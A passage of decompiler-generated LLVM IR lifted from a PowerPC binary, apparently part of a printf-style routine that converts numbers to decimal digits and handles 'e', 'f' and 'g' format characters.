  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_1000cdc8 = trunc i32 %storemerge to i8
  store i8 %v6_1000cdc8, i8* %stack_var_-200, align 1
  br label %dec_label_pc_1000cdcc

dec_label_pc_1000cdcc:                            ; preds = %dec_label_pc_1000cdbc, %dec_label_pc_1000cdc8
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000cd94, label %dec_label_pc_1000cf30, label %dec_label_pc_1000ce48

dec_label_pc_1000ce48:                            ; preds = %dec_label_pc_1000cdcc
  %v1_1000ce48 = icmp ult i32 %v0_1000ce48, 96
  %v2_1000ce48 = icmp ugt i32 %v0_1000ce48, 96
  %v3_1000ce48 = icmp eq i32 %v0_1000ce48, 96
  store i1 %v1_1000ce48, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000ce48, i1* %cr7_eq.global-to-local, align 1
  %v2_1000ce50 = add i32 %tmp, 16
  %v3_1000ce50 = inttoptr i32 %v2_1000ce50 to i32*
  store i32 32, i32* %v3_1000ce50, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_1000ce48, label %dec_label_pc_1000ce74, label %dec_label_pc_1000ce68

dec_label_pc_1000ce68:                            ; preds = %dec_label_pc_1000ce48
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ce74

dec_label_pc_1000ce74:                            ; preds = %dec_label_pc_1000ce48, %dec_label_pc_1000ce68
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_10013850.645 to i32), i32 8), %dec_label_pc_1000ce48 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_10013850.645 to i32), i32 12), %dec_label_pc_1000ce68 ]
  store i32 ptrtoint ([4 x i8]* @global_var_10013850.645 to i32), i32* %r9.global-to-local, align 4
  %v2_1000ce80 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000ce80, i32* @r8, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000d320

dec_label_pc_1000cf30:                            ; preds = %dec_label_pc_1000cdcc
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1000cf34 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_1000cf34, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_1000cf80 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_1000cf54

dec_label_pc_1000cf54:                            ; preds = %dec_label_pc_1000cfd4.dec_label_pc_1000cf54_crit_edge, %dec_label_pc_1000cf30
  %v0_1000cf58 = phi i32 [ %v0_1000cf58.pre, %dec_label_pc_1000cfd4.dec_label_pc_1000cf54_crit_edge ], [ %v0_1000cf5844, %dec_label_pc_1000cf30 ]
  %v3_1000cf58 = call %1 @__asm_cror(i32 %v0_1000cf58, i32 %tmp, i32 %v0_1000cf58)
  %v11_1000cf58 = extractvalue %1 %v3_1000cf58, 7
  store i4 %v11_1000cf58, i4* @cr4, align 1
  %v0_1000cf5c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000cf5c, label %dec_label_pc_1000cf70, label %dec_label_pc_1000cf84

dec_label_pc_1000cf70:                            ; preds = %dec_label_pc_1000cf54
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000cf84

dec_label_pc_1000cf84:                            ; preds = %dec_label_pc_1000cf54, %dec_label_pc_1000cf70
  %storemerge2 = phi i32 [ %v1_1000cf80, %dec_label_pc_1000cf70 ], [ %tmp55, %dec_label_pc_1000cf54 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_1000cf94 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000cf94 = add i32 %v0_1000cf94, 9
  store i32 %v1_1000cf94, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000cfb0

dec_label_pc_1000cfb0:                            ; preds = %dec_label_pc_1000cfb0.dec_label_pc_1000cfb0_crit_edge, %dec_label_pc_1000cf84
  %v1_1000cfb8 = phi i32 [ %v1_1000cfb8.pre, %dec_label_pc_1000cfb0.dec_label_pc_1000cfb0_crit_edge ], [ %v1_1000cf94, %dec_label_pc_1000cf84 ]
  %v0_1000cfb4 = phi i32 [ %v0_1000cfb4.pre, %dec_label_pc_1000cfb0.dec_label_pc_1000cfb0_crit_edge ], [ 0, %dec_label_pc_1000cf84 ]
  %v1_1000cfb0 = phi i32 [ %v1_1000cfb0.pre, %dec_label_pc_1000cfb0.dec_label_pc_1000cfb0_crit_edge ], [ 10, %dec_label_pc_1000cf84 ]
  %v1_1000cfc0 = phi i32 [ %v0_1000cfb0.pre, %dec_label_pc_1000cfb0.dec_label_pc_1000cfb0_crit_edge ], [ %storemerge2, %dec_label_pc_1000cf84 ]
  %v2_1000cfb0 = udiv i32 %v1_1000cfc0, %v1_1000cfb0
  store i32 %v2_1000cfb0, i32* %r0.global-to-local, align 4
  %v1_1000cfb4 = add i32 %v0_1000cfb4, 1
  store i32 %v1_1000cfb4, i32* %r8.global-to-local, align 4
  %v2_1000cfb8 = sub i32 %v1_1000cfb8, %v1_1000cfb4
  store i32 %v2_1000cfb8, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_1000cfb0, -10
  store i32 %v2_1000cfb0, i32* %r10.global-to-local, align 4
  %v2_1000cfc0 = add i32 %v1_1000cfc0, 48
  %v1_1000cfc8 = add i32 %v2_1000cfc0, %tmp76
  store i32 %v1_1000cfc8, i32* %r9.global-to-local, align 4
  %v1_1000cfcc = trunc i32 %v1_1000cfc8 to i8
  %v3_1000cfcc = inttoptr i32 %v2_1000cfb8 to i8*
  store i8 %v1_1000cfcc, i8* %v3_1000cfcc, align 1
  %v0_1000cfd0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000cfd0 = add i32 %v0_1000cfd0, -1
  store i32 %v1_1000cfd0, i32* %ctr.global-to-local, align 4
  %v2_1000cfd0 = icmp eq i32 %v1_1000cfd0, 0
  br i1 %v2_1000cfd0, label %dec_label_pc_1000cfd4, label %dec_label_pc_1000cfb0.dec_label_pc_1000cfb0_crit_edge

dec_label_pc_1000cfb0.dec_label_pc_1000cfb0_crit_edge: ; preds = %dec_label_pc_1000cfb0
  %v0_1000cfb0.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000cfb0.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000cfb4.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cfb8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000cfb0

dec_label_pc_1000cfd4:                            ; preds = %dec_label_pc_1000cfb0
  %v0_1000cfd4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000cfd4 = icmp slt i32 %v0_1000cfd4, 0
  %v3_1000cfd4 = icmp eq i32 %v0_1000cfd4, 0
  store i1 %v1_1000cfd4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cfd4, i1* %cr7_eq.global-to-local, align 1
  %v1_1000cfd8 = add i32 %v0_1000cfd4, 1
  store i32 %v1_1000cfd8, i32* %r7.global-to-local, align 4
  br i1 %v3_1000cfd4, label %dec_label_pc_1000cfd4.dec_label_pc_1000cf54_crit_edge, label %dec_label_pc_1000cfe0

dec_label_pc_1000cfd4.dec_label_pc_1000cf54_crit_edge: ; preds = %dec_label_pc_1000cfd4
  %v0_1000cf58.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000cf54

dec_label_pc_1000cfe0:                            ; preds = %dec_label_pc_1000cfd4
  %v0_1000cfe0 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000cfe0 = icmp ult i32 %v0_1000cfe0, 96
  %v2_1000cfe0 = icmp ugt i32 %v0_1000cfe0, 96
  %v3_1000cfe0 = icmp eq i32 %v0_1000cfe0, 96
  store i1 %v1_1000cfe0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cfe0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000cfe0, label %dec_label_pc_1000cff8, label %dec_label_pc_1000cfe8

dec_label_pc_1000cfe8:                            ; preds = %dec_label_pc_1000cfe0
  %v1_1000cff0 = add i32 %v0_1000cfe0, 32
  store i32 %v1_1000cff0, i32* %r0.global-to-local, align 4
  %v1_1000cff4 = urem i32 %v1_1000cff0, 256
  store i32 %v1_1000cff4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000cff8

dec_label_pc_1000cff8:                            ; preds = %dec_label_pc_1000cfe0, %dec_label_pc_1000cfe8
  %v0_1000d010 = phi i32 [ %v1_1000cff4, %dec_label_pc_1000cfe8 ], [ %v0_1000cfe0, %dec_label_pc_1000cfe0 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_1000cfe8 ], [ 101, %dec_label_pc_1000cfe0 ]
  %v1_1000cff8 = icmp slt i32 %v0_1000d010, 103
  %v3_1000cff8 = icmp eq i32 %v0_1000d010, 103
  store i1 %v1_1000cff8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cff8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000cff8, label %dec_label_pc_1000d000, label %dec_label_pc_1000d010

dec_label_pc_1000d000:                            ; preds = %dec_label_pc_1000cff8
  %v0_1000d000 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000d000 = icmp slt i32 %v0_1000d000, 0
  %v3_1000d000 = icmp eq i32 %v0_1000d000, 0
  store i1 %v1_1000d000, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d000, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d000, label %dec_label_pc_1000d018, label %dec_label_pc_1000d008

dec_label_pc_1000d008:                            ; preds = %dec_label_pc_1000d000
  %v1_1000d008 = add i32 %v0_1000d000, -1
  store i32 %v1_1000d008, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d018

dec_label_pc_1000d010:                            ; preds = %dec_label_pc_1000cff8
  %v1_1000d010 = icmp slt i32 %v0_1000d010, 102
  %v3_1000d010 = icmp eq i32 %v0_1000d010, 102
  store i1 %v1_1000d010, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d010, i1* %cr7_eq.global-to-local, align 1
  %v0_1000d020 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_1000d010, label %dec_label_pc_1000d020, label %dec_label_pc_1000d018

dec_label_pc_1000d018:                            ; preds = %dec_label_pc_1000d010, %dec_label_pc_1000d000, %dec_label_pc_1000d008
  %v0_1000d018 = phi i32 [ 0, %dec_label_pc_1000d000 ], [ %v1_1000d008, %dec_label_pc_1000d008 ], [ %v0_1000d020, %dec_label_pc_1000d010 ]
  store i32 %v0_1000d018, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d044

dec_label_pc_1000d020:                            ; preds = %dec_label_pc_1000d010
  %v1_1000d020 = load i32, i32* %r4.global-to-local, align 4
  %v2_1000d020 = add i32 %v1_1000d020, %v0_1000d020
  store i32 %v2_1000d020, i32* %r10.global-to-local, align 4
  %v1_1000d024 = icmp slt i32 %v2_1000d020, -1
  %v3_1000d024 = icmp eq i32 %v2_1000d020, -1
  store i1 %v1_1000d024, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d024, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_1000d020, -2
  br i1 %tmp77, label %dec_label_pc_1000d044, label %dec_label_pc_1000d02c

dec_label_pc_1000d02c:                            ; preds = %dec_label_pc_1000d020
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_1000d030 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_1000d030, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268488764, i32* @lr, align 4
  %v3_1000d038 = call i32 @__GI_memset(i32 %v2_1000d030, i32 48, i32 17)
  store i32 %v3_1000d038, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d044

dec_label_pc_1000d044:                            ; preds = %dec_label_pc_1000d020, %dec_label_pc_1000d018, %dec_label_pc_1000d02c
  %v1_1000d068 = phi i32 [ %v2_1000d020, %dec_label_pc_1000d020 ], [ %v0_1000d018, %dec_label_pc_1000d018 ], [ -1, %dec_label_pc_1000d02c ]
  %v1_1000d044 = icmp slt i32 %v1_1000d068, 16
  %v2_1000d044 = icmp sgt i32 %v1_1000d068, 16
  %v3_1000d044 = icmp eq i32 %v1_1000d068, 16
  store i1 %v1_1000d044, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d044, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_1000d058 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_1000d058, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_1000d044, label %dec_label_pc_1000d080, label %dec_label_pc_1000d064

dec_label_pc_1000d064:                            ; preds = %dec_label_pc_1000d044
  %v2_1000d064 = ptrtoint i32* %stack_var_-177 to i32
  %v2_1000d068 = add i32 %v1_1000d068, %v2_1000d064
  store i32 %v2_1000d068, i32* %r9.global-to-local, align 4
  %v1_1000d06c = add i32 %v2_1000d068, 2
  %v2_1000d06c = inttoptr i32 %v1_1000d06c to i8*
  %v3_1000d06c = load i8, i8* %v2_1000d06c, align 1
  %v4_1000d06c = zext i8 %v3_1000d06c to i32
  store i32 %v4_1000d06c, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d06c, i32* %r11.global-to-local, align 4
  %v1_1000d074 = sub nsw i32 52, %v4_1000d06c
  %v2_1000d074 = sub nuw nsw i32 -1, %v4_1000d06c
  %not.v5_1000d074 = icmp ugt i32 %v1_1000d074, %v2_1000d074
  %v1_1000d07c = zext i1 %not.v5_1000d074 to i32
  store i32 %v1_1000d07c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000d080

dec_label_pc_1000d080:                            ; preds = %dec_label_pc_1000d044, %dec_label_pc_1000d064, %dec_label_pc_1000d080.backedge
  %v0_1000d084 = phi i32 [ %v0_1000d084.pre, %dec_label_pc_1000d080.backedge ], [ 0, %dec_label_pc_1000d044 ], [ %v1_1000d07c, %dec_label_pc_1000d064 ]
  %v0_1000d080 = phi i32 [ %v0_1000d080.pre, %dec_label_pc_1000d080.backedge ], [ %v2_1000d058, %dec_label_pc_1000d044 ], [ %v1_1000d06c, %dec_label_pc_1000d064 ]
  %v1_1000d080 = add i32 %v0_1000d080, -1
  %v2_1000d080 = inttoptr i32 %v1_1000d080 to i8*
  %v3_1000d080 = load i8, i8* %v2_1000d080, align 1
  %v4_1000d080 = zext i8 %v3_1000d080 to i32
  store i32 %v1_1000d080, i32* %r11.global-to-local, align 4
  %v2_1000d084 = add i32 %v4_1000d080, %v0_1000d084
  store i32 %v2_1000d084, i32* %r0.global-to-local, align 4
  %v1_1000d088 = urem i32 %v2_1000d084, 256
  store i32 %v1_1000d088, i32* %r9.global-to-local, align 4
  %v1_1000d08c = trunc i32 %v2_1000d084 to i8
  store i8 %v1_1000d08c, i8* %v2_1000d080, align 1
  %v0_1000d090 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d090 = icmp slt i32 %v0_1000d090, 48
  %v3_1000d090 = icmp eq i32 %v0_1000d090, 48
  store i1 %v1_1000d090, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d090, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d094 = icmp ult i32 %v0_1000d090, 57
  %v2_1000d094 = icmp ugt i32 %v0_1000d090, 57
  %v3_1000d094 = icmp eq i32 %v0_1000d090, 57
  store i1 %v1_1000d094, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000d094, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000d094, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000d090, %v2_1000d094
  br i1 %brmerge, label %dec_label_pc_1000d080.backedge, label %dec_label_pc_1000d0a0

dec_label_pc_1000d080.backedge:                   ; preds = %dec_label_pc_1000d080
  %v0_1000d080.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000d084.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000d080

dec_label_pc_1000d0a0:                            ; preds = %dec_label_pc_1000d080
  %v2_1000d0a0 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_1000d0a0, i32* %r0.global-to-local, align 4
  %v0_1000d0a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1000d0a4, i32* @r7, align 4
  %v0_1000d0a8 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000d0a8 = icmp ult i32 %v0_1000d0a8, %v2_1000d0a0
  %v3_1000d0a8 = icmp ugt i32 %v0_1000d0a8, %v2_1000d0a0
  %v4_1000d0a8 = icmp eq i32 %v0_1000d0a8, %v2_1000d0a0
  store i1 %v2_1000d0a8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d0a8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_1000cf34, i32* %r8.global-to-local, align 4
  br i1 %v3_1000d0a8, label %dec_label_pc_1000d0c0, label %dec_label_pc_1000d0b4

dec_label_pc_1000d0b4:                            ; preds = %dec_label_pc_1000d0a0
  store i32 %v2_1000d0a0, i32* %r8.global-to-local, align 4
  %v1_1000d0b8 = add i32 %v0_1000d0a4, 1
  store i32 %v1_1000d0b8, i32* @r7, align 4
  store i32 %v2_1000d0a0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d0c0

dec_label_pc_1000d0c0:                            ; preds = %dec_label_pc_1000d0a0, %dec_label_pc_1000d0b4
  %v2_1000d0c8 = phi i32 [ %v0_1000d0a8, %dec_label_pc_1000d0a0 ], [ %v2_1000d0a0, %dec_label_pc_1000d0b4 ]
  %v0_1000d0c0 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d0c0 = icmp slt i32 %v0_1000d0c0, 103
  %v3_1000d0c0 = icmp eq i32 %v0_1000d0c0, 103
  store i1 %v1_1000d0c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d0c0, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000d0c8 = add i32 %v2_1000d0c8, 1
  %v4_1000d0c8 = inttoptr i32 %v3_1000d0c8 to i8*
  store i8 0, i8* %v4_1000d0c8, align 1
  %v0_1000d0cc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d0cc = add i32 %v0_1000d0cc, 1
  store i32 %v1_1000d0cc, i32* %r9.global-to-local, align 4
  %v0_1000d0d0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d0d0, label %dec_label_pc_1000d0d4, label %dec_label_pc_1000d0f8

dec_label_pc_1000d0d4:                            ; preds = %dec_label_pc_1000d0c0
  %v0_1000d0d4 = load i32, i32* @r7, align 4
  %v1_1000d0d4 = icmp slt i32 %v0_1000d0d4, -4
  %v3_1000d0d4 = icmp eq i32 %v0_1000d0d4, -4
  store i1 %v1_1000d0d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d0d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1000d0d4, label %dec_label_pc_1000d0f0, label %dec_label_pc_1000d0dc

dec_label_pc_1000d0dc:                            ; preds = %dec_label_pc_1000d0d4
  %v1_1000d0dc = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d0dc = icmp sgt i32 %v1_1000d0dc, %v0_1000d0d4
  %v3_1000d0dc = icmp slt i32 %v1_1000d0dc, %v0_1000d0d4
  %v4_1000d0dc = icmp eq i32 %v1_1000d0dc, %v0_1000d0d4
  store i1 %v2_1000d0dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d0dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d0dc, label %dec_label_pc_1000d0f0, label %dec_label_pc_1000d0e4

dec_label_pc_1000d0e4:                            ; preds = %dec_label_pc_1000d0dc
  %v2_1000d0e4 = sub i32 %v1_1000d0dc, %v0_1000d0d4
  store i32 %v2_1000d0e4, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d110

dec_label_pc_1000d0f0:                            ; preds = %dec_label_pc_1000d0dc, %dec_label_pc_1000d0d4
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d104

dec_label_pc_1000d0f8:                            ; preds = %dec_label_pc_1000d0c0
  %v0_1000d0f8 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d0f8 = icmp slt i32 %v0_1000d0f8, 102
  %v3_1000d0f8 = icmp eq i32 %v0_1000d0f8, 102
  store i1 %v1_1000d0f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d0f8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_1000d0f8, i32* %r4.global-to-local, align 4
  br i1 %v3_1000d0f8, label %dec_label_pc_1000d110thread-pre-split, label %dec_label_pc_1000d104

dec_label_pc_1000d104:                            ; preds = %dec_label_pc_1000d0f8, %dec_label_pc_1000d0f0
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_1000d124

dec_label_pc_1000d110thread-pre-split:            ; preds = %dec_label_pc_1000d0f8
  %v0_1000d110.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_1000d110

dec_label_pc_1000d110:                            ; preds = %dec_label_pc_1000d110thread-pre-split, %dec_label_pc_1000d0e4
  %v0_1000d114 = phi i32 [ %v0_1000d110.pr, %dec_label_pc_1000d110thread-pre-split ], [ %v0_1000d0d4, %dec_label_pc_1000d0e4 ]
  %v1_1000d110 = icmp slt i32 %v0_1000d114, 0
  %v2_1000d110 = icmp sgt i32 %v0_1000d114, 0
  %v3_1000d110 = icmp eq i32 %v0_1000d114, 0
  store i1 %v1_1000d110, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000d110, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000d110, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_1000d114, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_1000d114, -1
  br i1 %tmp78, label %dec_label_pc_1000d124, label %dec_label_pc_1000d11c

dec_label_pc_1000d11c:                            ; preds = %dec_label_pc_1000d110
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_1000d120 = load i32, i32* %r8.global-to-local, align 4
  %v3_1000d120 = add i32 %v2_1000d120, -1
  %v4_1000d120 = inttoptr i32 %v3_1000d120 to i8*
  store i8 48, i8* %v4_1000d120, align 1
  store i32 %v3_1000d120, i32* %r8.global-to-local, align 4
  %v1_1000d140.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000d154.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_1000d124

dec_label_pc_1000d124:                            ; preds = %dec_label_pc_1000d110, %dec_label_pc_1000d104, %dec_label_pc_1000d11c
  %v0_1000d154 = phi i1 [ %v1_1000d110, %dec_label_pc_1000d110 ], [ false, %dec_label_pc_1000d104 ], [ %v0_1000d154.pre, %dec_label_pc_1000d11c ]
  %v1_1000d140 = phi i32 [ %v1_1000d0cc, %dec_label_pc_1000d110 ], [ %v1_1000d0cc, %dec_label_pc_1000d104 ], [ %v1_1000d140.pre, %dec_label_pc_1000d11c ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_1000d130 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_1000d130, i32* %r0.global-to-local, align 4
  %v0_1000d138 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000d138 = add i32 %v0_1000d138, 1
  store i32 %v1_1000d138, i32* %r6.global-to-local, align 4
  %v2_1000d140 = sub i32 %v1_1000d140, %v1_1000d138
  store i32 %v2_1000d140, i32* %r11.global-to-local, align 4
  %v1_1000d144 = inttoptr i32 %v0_1000d138 to i8*
  %v2_1000d144 = load i8, i8* %v1_1000d144, align 1
  %v3_1000d144 = zext i8 %v2_1000d144 to i32
  store i32 %v3_1000d144, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_1000d154, label %dec_label_pc_1000d1b4, label %dec_label_pc_1000d158

dec_label_pc_1000d158:                            ; preds = %dec_label_pc_1000d124
  %v0_1000d158 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000d158 = icmp slt i32 %v0_1000d158, %v2_1000d140
  %v4_1000d158 = icmp eq i32 %v0_1000d158, %v2_1000d140
  store i1 %v2_1000d158, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000d158, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_1000d158, label %dec_label_pc_1000d1ac, label %dec_label_pc_1000d16c

dec_label_pc_1000d16c:                            ; preds = %dec_label_pc_1000d158
  %v2_1000d16c = sub i32 %v0_1000d158, %v2_1000d140
  store i32 %v2_1000d16c, i32* %r0.global-to-local, align 4
  %v4_1000d16c = icmp sgt i32 %v2_1000d16c, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_1000d16c, label %dec_label_pc_1000d188, label %dec_label_pc_1000d178

dec_label_pc_1000d178:                            ; preds = %dec_label_pc_1000d16c
  %v2_1000d17c = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000d17c, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d1d0

dec_label_pc_1000d188:                            ; preds = %dec_label_pc_1000d16c
  store i32 ptrtoint (i32* @global_var_10013853.647 to i32), i32* %r9.global-to-local, align 4
  %v2_1000d194 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_1000d194, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_1000d1d0

dec_label_pc_1000d1ac:                            ; preds = %dec_label_pc_1000d158
  %v0_1000d1ac = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1000d1ac, label %dec_label_pc_1000d1bc, label %dec_label_pc_1000d1b0

dec_label_pc_1000d1b0:                            ; preds = %dec_label_pc_1000d1ac
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d1b4

dec_label_pc_1000d1b4:                            ; preds = %dec_label_pc_1000d124, %dec_label_pc_1000d1b0
  %v2_1000d1b4 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000d1b4, i32* @r8, align 4
  br label %dec_label_pc_1000d1d0

dec_label_pc_1000d1bc:                            ; preds = %dec_label_pc_1000d1ac
  %v2_1000d1bc = sub i32 %v2_1000d140, %v0_1000d158
  store i32 %v2_1000d1bc, i32* %r11.global-to-local, align 4
  %v2_1000d1c4 = add i32 %v0_1000d158, %v1_1000d138
  store i32 %v2_1000d1c4, i32* %r6.global-to-local, align 4
  %v2_1000d1c8 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000d1c8, i32* @r8, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000d1d0

dec_label_pc_1000d1d0:                            ; preds = %dec_label_pc_1000d1b4, %dec_label_pc_1000d188, %dec_label_pc_1000d178, %dec_label_pc_1000d1bc
  %v1_1000d1fc = phi i32 [ %v2_1000d1b4, %dec_label_pc_1000d1b4 ], [ %v2_1000d194, %dec_label_pc_1000d188 ], [ %v2_1000d17c, %dec_label_pc_1000d178 ], [ %v2_1000d1c8, %dec_label_pc_1000d1bc ]
  %v0_1000d1dc = phi i32 [ %v2_1000d140, %dec_label_pc_1000d1b4 ], [ 0, %dec_label_pc_1000d188 ], [ 0, %dec_label_pc_1000d178 ], [ %v2_1000d1bc, %dec_label_pc_1000d1bc ]
  %v3_1000d1d0 = load i32, i32* %v2_1000cda0, align 4
  store i32 %v3_1000d1d0, i32* %r0.global-to-local, align 4
  %v1_1000d1d4 = and i32 %v3_1000d1d0, 16
  store i32 %v1_1000d1d4, i32* %r9.global-to-local, align 4
  %v3_1000d1d4 = icmp eq i32 %v1_1000d1d4, 0
  br i1 %v3_1000d1d4, label %dec_label_pc_1000d1dc, label %dec_label_pc_1000d1f4

dec_label_pc_1000d1dc:                            ; preds = %dec_label_pc_1000d1d0
  %v1_1000d1dc = icmp slt i32 %v0_1000d1dc, 0
  %v3_1000d1dc = icmp eq i32 %v0_1000d1dc, 0
  store i1 %v1_1000d1dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000d1dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d1dc, label %dec_label_pc_1000d1e4, label %dec_label_pc_1000d1f4

dec_label_pc_1000d1e4:                            ; preds = %dec_label_pc_1000d1dc
  %v0_1000d1e4 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d1e4 = icmp slt i32 %v0_1000d1e4, 103
  %v3_1000d1e4 = icmp eq i32 %v0_1000d1e4, 103
